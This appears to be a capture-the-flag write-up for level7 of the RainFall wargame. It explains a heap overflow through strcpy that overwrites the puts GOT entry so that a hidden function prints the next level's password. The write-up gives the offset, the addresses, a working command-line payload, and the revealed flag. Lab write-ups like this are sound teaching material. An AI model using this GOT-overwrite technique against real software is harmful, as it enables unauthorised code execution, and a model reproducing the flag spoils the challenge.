in this binary we allocate space for two structures of size `8` that have this format:

```c
struct node {
    int     num;
    char    *str;
};
```

and inside each one we allocate space for a string (8 bytes).

at the end of the `main` fucntion we open the pass file write its content to the global variable `c` and then after it we call `puts`:

```c
file = fopen("/home/user/level8/.pass", "r");
fgets(c, 68, file);
puts("~~");
```

before this the program uses `strcpy` to copy our first two arguments to both strings in the two structs: 

```c
strcpy(node1->str, av[1]);
strcpy(node2->str, av[2]);
```
we can leverage this to overwrite `puts` address and point it to an unused function `m` that prints the content of `c` variable.

we need three things :
- the offset between the address that points to the 2nd node string and the start of the first node string
- the address of `puts` in the `GOT`
- and finally, the address of function `m` which will replace `puts`


using gdb like that last time we find:

- the offset = 20
- `puts` = 0x8049928
- `m` = 0x080484f4

now that we have all we need, our payload will be like this:

```bash
./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
```

what will this do is overwrite the address in the second node from the first node string and when the program reaches the second strcpy call it will write the 2nd argument to puts `GOT` location, and finally when we reach puts call it will call our function `m`.

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1746642370
```

and there you go.

